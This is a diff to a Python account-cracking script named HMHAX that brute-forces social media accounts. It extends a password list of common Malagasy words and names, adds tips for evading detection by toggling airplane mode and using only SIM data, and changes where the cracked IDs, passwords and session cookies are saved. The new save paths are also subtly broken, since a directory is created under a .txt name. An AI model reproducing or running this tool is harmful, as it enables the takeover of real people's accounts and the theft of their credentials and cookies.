@@ -39,6 +39,7 @@ saisie_mot_de_passe = getpass.getpass("INSERER LE PASSCODE : ")
 if saisie_mot_de_passe == mot_de_passe:
 
     print("PASSECODE CORRECT✅. Lancement ...")
+        
 
     # Exécuter la commande git pull
 
@@ -98,23 +99,21 @@ word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
 
 logo=(f'''{B}
 
-HMHAXHMHAXHMHAXHMHAXHMHAXHMHAXHMHAX
-HMHAXHMHAX               HMHAXHMHAX
-HMHAXHMHAXHMH         HAXHMHAXHMHAX                              
-HMHAXHMHAXHMHAX     HMHAXHMHAXHMHAX
-HMHAXHMHAXHMHAXHMHAXHMHAXHMHAXHMHAX
+.__              .__                     
+|  |__    _____  |  |__  _____   ___  ___
+|  |  \  /     \ |  |  \ \__  \  \  \/  /
+|   Y  \|  Y Y  \|   Y  \ / __ \_ >    < 
+|___|  /|__|_|  /|___|  /(____  //__/\_ \
+     \/       \/      \/      \/       \/
+
                                     
 {warna}--------------------------------------------{B}
-
- TOOL NAME : {warna}{P}HMHAX{P}{warna}
-
- Owner    : {M}HMHAX{M}
-
- Facebook : {bblue}HMHAX{bblue}
-
- Tools    : {warna}[{M}VERSION 1.0{warna}]{warna}
-
---------------------------------------------{B}''')
+TOOL NAME : {warna}{P}HMHAX{P}{warna}
+Owner: {M}HMHAX{M}
+Tricks : {B}Use Airplane Mode every 5min{B}
+N.B: {bblue}SIM DATA ONLY DON'T USE WIFI{bblue}
+Tool: {warna}[{M}VERSION 1.5{warna}]{warna}
+{warna}--------------------------------------------{B}''')
 
 #-------------linex def -------------#
 
@@ -202,7 +201,7 @@ def BD_CLONING():
 
             ids=code+psx
 
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako','Baby1234', 'babyko', 'Urus1234', 'ferari', '12345678', 'Business123', 'Zandriko', 'Papako', 'Zoroluffy', 'Onepiece' , 'Ceasar123', 'Rimka', 'Lune123', '200509', 'Love123', 'Mylova', 'Lover1234' , 'Freefire123', 'Freefire', 'freefire' , 'freefire123', '200609', '200409' , '200309', '200209', '202403', 'razana' , 'Razana' , '200109', '200009', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Anjara','anjara','Antananarivo','Malagasy','Judio99','Angelina','Malala','fitiavana','mamako','Baby1234', 'babyko', 'Urus1234', 'ferari', '12345678', 'Business123', 'Zandriko', 'Papako', 'Zoroluffy', 'Onepiece' , 'Ceasar123', 'Rimka', 'Lune123', '200509', 'Love123', 'Mylova', 'Lover1234' , 'Freefire123', 'Freefire', 'freefire' , 'freefire123', '200609', '200409' , '200309', '200209', '202403', 'razana' , 'Razana' , '200109', '200009', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
 
             Dipto.submit(method_crack,ids,passlist)
 
@@ -270,15 +269,15 @@ def method_crack(ids, passlist):
 
                     print('\033[1;32m [COOKIES] '+coki)
 
-                    # Vérifier si le dossier HMHAX_OK existe et le créer si nécessaire
+                    # Vérifier si le dossier HMHAX-OK.txt existe et le créer si nécessaire
 
-                    if not os.path.exists("/sdcard/HMHAX-OK"):
+                    if not os.path.exists("/sdcard/HMHAX-OK.txt"):
 
-                        os.makedirs("/sdcard/HMHAX-OK")
+                        os.makedirs("/sdcard/HMHAX-OK.txt")
 
                     # Enregistrer dans le fichier HMHAX-OK.txt
 
-                    with open(os.path.join("/sdcard/HMHAX-IDZ", "HMHAX-OK.txt"), 'a') as f:
+                    with open(os.path.join("/sdcard/HMHAX-OK.txt", "HMHAX-OK.txt"), 'a') as f:
 
                         f.write(str(uid)+'|'+pas+'|'+coki+'\n')
 
@@ -292,7 +291,7 @@ def method_crack(ids, passlist):
 
                 # Enregistrer dans le fichier HMHAX-CP.txt
 
-                with open(os.path.join("/sdcard/HMHAX-IDS", "HMHAX-CP.txt"), 'a') as f:
+                with open(os.path.join("/sdcard/HMHAX-CP.txt", "HMHAX-CP.txt"), 'a') as f:
 
                     f.write(ids+'|'+pas+'\n')
 
